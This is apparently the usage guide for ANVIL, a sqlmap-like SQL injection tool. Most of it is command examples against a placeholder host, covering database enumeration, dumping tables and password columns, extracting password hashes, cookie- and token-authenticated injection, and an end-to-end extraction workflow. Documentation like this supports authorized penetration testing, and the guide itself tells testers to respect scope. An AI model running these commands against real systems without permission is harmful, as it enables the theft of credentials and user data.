# ANVIL SQL Injection Exploitation Guide

This guide covers ANVIL's data extraction capabilities, which rival and surpass sqlmap's functionality while maintaining a cleaner, more reliable architecture.

## Why ANVIL Over sqlmap?

| Feature | sqlmap | ANVIL |
|---------|--------|-------|
| Detection Accuracy | Heuristic-based, many false positives | Statistical modeling, confidence scoring |
| False Positive Rate | High | Low (threshold-based) |
| Architecture | Monolithic | Modular, extensible |
| Enterprise Ready | Risky defaults | Safe by default |
| Explainability | Limited | Full confidence breakdown |
| Modern API Support | Poor | Built-in |

## Enumeration Commands

### Database Enumeration

```bash
# List all databases
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs

# Get database information
anvil -t "http://target.com/page.php?id=1" -p id --sqli --banner --current-user --current-db

# Check if user is DBA
anvil -t "http://target.com/page.php?id=1" -p id --sqli --is-dba
```

### Table Enumeration

```bash
# List tables in a specific database
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D targetdb --tables

# Get full schema (all databases, tables, columns)
anvil -t "http://target.com/page.php?id=1" -p id --sqli --schema
```

### Column Enumeration

```bash
# List columns in a specific table
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D targetdb -T users --columns
```

### Data Extraction

```bash
# Dump all data from a table
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D targetdb -T users --dump

# Dump specific columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D targetdb -T users -C "username,password" --dump

# Dump with row limits
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D targetdb -T users --dump --start 0 --stop 10

# Dump everything (DANGEROUS)
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dump-all
```

### User & Credential Enumeration

```bash
# List database users
anvil -t "http://target.com/page.php?id=1" -p id --sqli --users

# Extract password hashes
anvil -t "http://target.com/page.php?id=1" -p id --sqli --passwords

# Enumerate user privileges
anvil -t "http://target.com/page.php?id=1" -p id --sqli --privileges

# Enumerate user roles
anvil -t "http://target.com/page.php?id=1" -p id --sqli --roles
```

## Extraction Techniques

ANVIL automatically selects the best extraction technique based on the detected vulnerability:

### 1. UNION-based Extraction (Fastest)
Used when the application reflects query results in the response.

### 2. Boolean-based Blind Extraction
Used when true/false conditions cause different responses.

### 3. Time-based Blind Extraction
Used when no visible difference exists but timing can be measured.

### 4. Error-based Extraction
Used when database errors are reflected in the response.

## Authentication

For authenticated pages:

```bash
# Using cookies
anvil -t "http://target.com/admin/page.php?id=1" -p id --sqli --dbs \
      --cookie "PHPSESSID=abc123; security=low"

# Using headers
anvil -t "http://target.com/api/users?id=1" -p id --sqli --dbs \
      -H "Authorization: Bearer eyJ..."
```

## POST-based Injection

```bash
# POST parameter testing
anvil -t "http://target.com/login.php" -p username --method POST \
      --data "username=admin&password=test" --sqli --dbs
```

## Detection Tuning

### Risk Levels

- `--risk 1`: Safe payloads only (default)
- `--risk 2`: Moderate risk payloads
- `--risk 3`: Aggressive payloads (may cause data modification)

### Test Levels

- `--level 1`: Basic tests (default)
- `--level 2`: Extended tests
- `--level 3`: Comprehensive tests (slow but thorough)

### Confidence Threshold

```bash
# Only report high-confidence findings
anvil -t "http://target.com/page.php?id=1" -p id --sqli --threshold 0.8

# Lower threshold for more sensitive detection
anvil -t "http://target.com/page.php?id=1" -p id --sqli --threshold 0.3
```

## Technique Selection

Force specific detection techniques:

```bash
# Boolean only
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique B

# Time-based only
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique T

# UNION-based only
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique U

# All techniques
anvil -t "http://target.com/page.php?id=1" -p id --sqli --technique BEUTS
```

## Database Support

ANVIL supports extraction from:

- **MySQL/MariaDB**: Full support
- **PostgreSQL**: Full support
- **Microsoft SQL Server**: Full support
- **Oracle**: Partial support
- **SQLite**: Basic support

## Output Formats

```bash
# JSON output
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs --format json

# CSV output
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D db -T users --dump --format csv

# Save to file
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs -o output.txt
```

## Best Practices

1. **Start with detection**: Always confirm SQLi before attempting exploitation
2. **Use appropriate risk levels**: Start with --risk 1 in production
3. **Limit extraction**: Use --start/--stop to avoid extracting too much data
4. **Respect scope**: Only test systems you have permission to test
5. **Document findings**: Use --output to save results

## Example Workflow

```bash
# Step 1: Detect vulnerability
anvil -t "http://target.com/page.php?id=1" -p id --sqli

# Step 2: Get database info
anvil -t "http://target.com/page.php?id=1" -p id --sqli --banner --current-user --current-db

# Step 3: Enumerate databases
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs

# Step 4: Enumerate tables
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D webapp --tables

# Step 5: Enumerate columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D webapp -T users --columns

# Step 6: Extract data
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D webapp -T users -C "username,password" --dump
```

## Comparison with sqlmap

```bash
# sqlmap
sqlmap -u "http://target.com/page.php?id=1" --dbs

# ANVIL (equivalent)
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs
```

ANVIL provides the same functionality with better accuracy, cleaner output, and safer defaults.

